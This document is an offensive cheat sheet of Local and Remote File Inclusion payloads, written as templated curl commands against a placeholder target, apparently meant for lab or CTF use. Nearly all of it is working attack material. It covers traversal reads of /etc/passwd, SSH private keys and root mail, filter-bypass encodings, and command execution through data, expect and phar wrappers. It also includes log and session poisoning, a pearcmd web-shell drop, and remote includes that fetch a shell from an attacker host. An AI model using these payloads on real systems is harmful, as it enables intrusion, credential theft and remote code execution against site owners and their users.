# LFI / RFI Payloads

> Local/Remote File Inclusion payloads — traversal, wrappers, log poisoning, filter bypass

<!-- tags: lfi, rfi, web, traversal, payload, exploit -->

---

## lfi traversal read passwd
Climb out of webroot to read /etc/passwd.

```bash
curl -s "{{URL:url:http://target.htb/page.php?file=}}../../../../etc/passwd"
```

<!-- meta: risk=med | phase=exploit | tags=lfi,traversal -->

---

## brute lfi traversal depth
When depth is unknown, hammer common depths.

```bash
for i in 1 2 3 4 5 6 7 8 9 10; do dots=$(printf '../%.0s' $(seq 1 $i)); curl -s "{{URL:url:http://target.htb/page.php?file=}}${dots}etc/passwd"; done
```

<!-- meta: risk=med | phase=enum | tags=lfi,depth -->

---

## bypass lfi null byte legacy php
Strip enforced extension on PHP <5.3.4.

```bash
curl -s "{{URL:url:http://target.htb/page.php?file=}}../../../../etc/passwd%00"
```

<!-- meta: risk=med | phase=exploit | tags=lfi,nullbyte,legacy -->

---

## bypass lfi double encoding
Bypass naive ../ filters.

```bash
curl -s "{{URL:url:http://target.htb/page.php?file=}}%252e%252e%252f%252e%252e%252fetc%252fpasswd"
```

<!-- meta: risk=med | phase=exploit | tags=lfi,bypass,encoding -->

---

## bypass lfi encoded slash apache
Use %2e/%2f to bypass path normalization.

```bash
curl -s "{{URL:url:http://target.htb/}}assets/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

<!-- meta: risk=med | phase=exploit | tags=lfi,bypass,apache -->

---

## bypass lfi strip once nested
Filters that remove ../ once: use nested form.

```bash
curl -s "{{URL:url:http://target.htb/page.php?file=}}....//....//....//etc/passwd"
```

<!-- meta: risk=med | phase=exploit | tags=lfi,bypass -->

---

## lfi read php source filter
Base64-encode PHP source to defeat interpreter.

```bash
curl -s "{{URL:url:http://target.htb/page.php?file=}}php://filter/convert.base64-encode/resource={{TARGET_FILE:str:index}}" | grep -oE 'PD9w[A-Za-z0-9+/=]+' | base64 -d
```

<!-- meta: risk=med | phase=exploit | tags=lfi,wrapper,php -->

---

## bypass lfi filter chain utf
Bypass when base64 string is detected.

```bash
curl -s "{{URL:url:http://target.htb/page.php?file=}}php://filter/convert.iconv.utf-8.utf-16le|convert.iconv.utf-16le.utf-8|convert.base64-encode/resource={{TARGET_FILE:str:config}}"
```

<!-- meta: risk=med | phase=exploit | tags=lfi,wrapper,bypass -->

---

## lfi rce data wrapper
Inline PHP via data: URI.

```bash
curl -s "{{URL:url:http://target.htb/page.php?file=}}data://text/plain,<?php system('{{CMD:str:id}}'); ?>"
```

<!-- meta: risk=high | phase=exploit | tags=lfi,wrapper,rce -->

---

## lfi rce data base64
Same but base64-encoded payload.

```bash
echo "<?php system(\$_GET[0]); ?>" | base64
curl -s "{{URL:url:http://target.htb/page.php?file=}}data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4=&0={{CMD:str:id}}"
```

<!-- meta: risk=high | phase=exploit | tags=lfi,wrapper,rce -->

---

## lfi rce expect wrapper
Run command directly via expect wrapper.

```bash
curl -s "{{URL:url:http://target.htb/page.php?file=}}expect://{{CMD:str:id}}"
```

<!-- meta: risk=critical | phase=exploit | tags=lfi,wrapper,rce -->

---

## lfi phar deserialization
Trigger PHP deserialization via phar archive (with metadata gadget).

```bash
curl -s "{{URL:url:http://target.htb/page.php?file=}}phar://{{UPLOADED_PHAR:str:/tmp/exploit.phar}}/test.txt"
```

<!-- meta: risk=high | phase=exploit | tags=lfi,phar,deser -->

---

## lfi rce proc self environ
Poison User-Agent then include environ.

```bash
curl -s "{{URL:url:http://target.htb/page.php?file=}}../../../../proc/self/environ" -A "<?php system(\$_GET[0]); ?>"
curl -s "{{URL:url:http://target.htb/page.php?file=}}../../../../proc/self/environ&0={{CMD:str:id}}"
```

<!-- meta: risk=high | phase=exploit | tags=lfi,procselfenviron,rce -->

---

## lfi rce apache log poison
Inject PHP via User-Agent in access.log.

```bash
curl -s "{{URL:url:http://target.htb/}}" -A "<?php system(\$_GET[0]); ?>"
curl -s "{{URL:url:http://target.htb/page.php?file=}}../../../../var/log/apache2/access.log&0={{CMD:str:id}}"
```

<!-- meta: risk=high | phase=exploit | tags=lfi,logpoison,apache,rce -->

---

## lfi rce ssh log poison
SSH login attempt with PHP code as username.

```bash
ssh '<?php system($_GET[0]); ?>'@{{TARGET:ip}}
curl -s "{{URL:url:http://target.htb/page.php?file=}}../../../../var/log/auth.log&0={{CMD:str:id}}"
```

<!-- meta: risk=high | phase=exploit | tags=lfi,logpoison,ssh,rce -->

---

## lfi read root mail
Cron mail / mbox file read.

```bash
curl -s "{{URL:url:http://target.htb/page.php?file=}}../../../../var/spool/mail/root"
```

<!-- meta: risk=med | phase=exploit | tags=lfi,mail -->

---

## lfi read ssh private key
Read user SSH key for lateral SSH.

```bash
curl -s "{{URL:url:http://target.htb/page.php?file=}}../../../../home/{{USERNAME:str:user}}/.ssh/id_rsa"
```

<!-- meta: risk=high | phase=exploit | tags=lfi,ssh,key -->

---

## lfi rce php session
Include attacker-controlled session file.

```bash
curl -s "{{URL:url:http://target.htb/}}" -b "PHPSESSID=ctf"
echo "<?php system(\$_GET[0]); ?>" then store in /var/lib/php/sessions/sess_ctf
curl -s "{{URL:url:http://target.htb/page.php?file=}}../../../../var/lib/php/sessions/sess_ctf&0={{CMD:str:id}}"
```

<!-- meta: risk=high | phase=exploit | tags=lfi,session,rce -->

---

## lfi read windows files
Read Windows files via traversal.

```bash
curl -s "{{URL:url:http://target.htb/page.php?file=}}../../../../Windows/System32/drivers/etc/hosts"
```

<!-- meta: risk=med | phase=exploit | tags=lfi,windows -->

---

## bypass lfi windows mixed slash
Windows accepts mixed forward/back slashes.

```bash
curl -s "{{URL:url:http://target.htb/page.php?file=}}../..\\../..\\Windows/system32\\drivers/etc\\hosts"
```

<!-- meta: risk=med | phase=exploit | tags=lfi,windows,bypass -->

---

## lfi read hmailserver config
Common Windows mail server target.

```bash
curl -s "{{URL:url:http://target.htb/download.php?file=}}../../../../../../../../Bin/hmailserver.ini"
```

<!-- meta: risk=med | phase=exploit | tags=lfi,windows,hmailserver -->

---

## lfi rce pearcmd
Classic PEAR/pearcmd LFI to RCE pattern.

```bash
curl -g -s "{{URL:url:http://target.htb/}}page.php?file=../../../../../usr/share/php/PEAR&namespace=pearcmd&+config-create+/<?=system(\$_GET[0]);?>+/var/www/html/d.php"
curl -s "{{URL:url:http://target.htb/}}d.php?0={{CMD:str:id}}"
```

<!-- meta: risk=critical | phase=exploit | tags=lfi,pearcmd,rce -->

---

## rfi rce remote include
Pull PHP from attacker host (allow_url_include=1 needed).

```bash
curl -s "{{URL:url:http://target.htb/page.php?file=}}http://{{LHOST:ip}}:{{LPORT:port:8000}}/shell.txt"
```

<!-- meta: risk=critical | phase=exploit | tags=rfi,rce -->

---

## rfi rce smb share windows
Include via SMB UNC path.

```bash
curl -s "{{URL:url:http://target.htb/page.php?file=}}\\\\{{LHOST:ip}}\\share\\shell.php"
```

<!-- meta: risk=critical | phase=exploit | tags=rfi,smb,windows -->

---

## fuzz lfi sensitive files wordlist
Common files to try via fuzzer.

```bash
echo -e "/etc/passwd\n/etc/shadow\n/etc/hosts\n/etc/hostname\n/proc/self/environ\n/proc/self/cmdline\n/proc/self/status\n/proc/version\n/etc/issue\n/etc/motd\n/var/log/apache2/access.log\n/var/log/nginx/access.log\n/var/log/auth.log\n/root/.bash_history\n/home/user/.bash_history\n/home/user/.ssh/id_rsa\n/var/www/html/config.php\n/var/www/html/wp-config.php\n/etc/apache2/apache2.conf\n/etc/nginx/nginx.conf"
```

<!-- meta: risk=safe | phase=enum | tags=lfi,wordlist -->
